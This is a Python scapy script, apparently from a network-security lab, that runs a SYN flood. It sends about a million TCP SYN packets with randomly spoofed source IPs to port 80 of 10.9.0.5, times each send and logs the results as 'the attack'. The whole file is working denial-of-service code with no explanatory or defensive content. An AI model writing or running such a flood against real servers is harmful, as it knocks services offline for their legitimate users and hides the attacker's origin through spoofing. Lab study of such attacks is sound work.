import random

import scapy
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.all import *
from scapy.layers.l2 import Ether
from time import time


def syn_packet(sequence):
    # ------------IP Layer--------------#
    ip = IP(src=RandIP(), dst="10.9.0.5")
    # -----------------------------------#

    # ------------Transport Layer--------------#
    tcp = TCP(sport=random.randint(1024,65000), dport=80, flags="S", seq=counter)
    # -----------------------------------------#

    # ------------The Complete Packet--------------#
    syn_packet = ip / tcp
    # ---------------------------------------------#

    # add calculation of time
    start = time()
    send(syn_packet, verbose=False)
    end = time()
    calc = end - start

    return calc




if __name__ == '__main__':
    print("started")
    fp = open("syns_results_p.txt", "w")
    temp = 0
    temp1 = 0
    counter = 0
    start1 = time()
    for i in range(1, 100):
        for j in range(1, 10000):
            counter = counter + 1
            temp = syn_packet(counter)
            temp = round(temp, 3)
            temp1 = temp1 + temp
            fp.write(str(counter) + " " + str(temp) + "\n")


        print("finished loop number " + str(i))

    end1 = time()
    the_whole_time_for_the_attack = end1 - start1

    fp.write("the average time for each packet is: " + str(temp1/counter) +"\n")
    fp.write("the time for the whole attack is: " + str(the_whole_time_for_the_attack))
    fp.close()


